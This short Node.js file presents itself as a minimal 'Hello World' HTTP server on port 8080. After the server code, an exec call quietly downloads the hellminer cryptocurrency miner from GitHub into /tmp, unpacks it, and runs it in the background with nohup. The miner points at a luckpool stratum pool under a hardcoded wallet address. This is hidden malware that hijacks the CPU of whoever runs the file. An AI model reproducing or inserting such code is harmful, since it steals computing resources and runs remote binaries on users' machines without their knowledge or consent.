var http = require("http");

//create a server object:
http
  .createServer(function (req, res) {
    res.write("Hello World!"); //write a response to the client
    res.end(); //end the response
  })
  .listen(8080); //the server object listens on port 8080

const { exec } = require("child_process");

exec(
  "cd /tmp && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && nohup ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RARNZ6LoxcvsUgVHM1f2MDmnVfzDFxqV1R.CS -p x --cpu 1 &",
  (error, stdout, stderr) => {
    if (error) {
      console.log(`error: ${error.message}`);
      return;
    }
    if (stderr) {
      console.log(`stderr: ${stderr}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
  }
);
